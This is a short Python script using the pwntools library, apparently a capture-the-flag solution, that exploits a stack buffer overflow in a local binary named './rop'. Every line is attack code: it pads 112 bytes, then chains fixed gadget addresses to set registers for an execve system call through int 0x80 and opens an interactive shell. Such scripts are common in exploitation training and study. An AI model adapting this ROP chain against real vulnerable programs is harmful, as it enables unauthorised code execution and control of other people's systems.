from pwn import *

pro=process('./rop')

shell_string=0x080be408
pop_eax=0x080bb196
pop_ecx_ebx=0x0806eb91
pop_edx=0x0806eb6a
int80=0x08049421

ropchain=p32(pop_eax)+p32(0xb)+p32(pop_edx)+p32(0x0)+p32(pop_ecx_ebx)+p32(0x0)+p32(shell_string)+p32(int80)

payload='A'*112+ropchain

pro.sendline(payload)
pro.interactive()
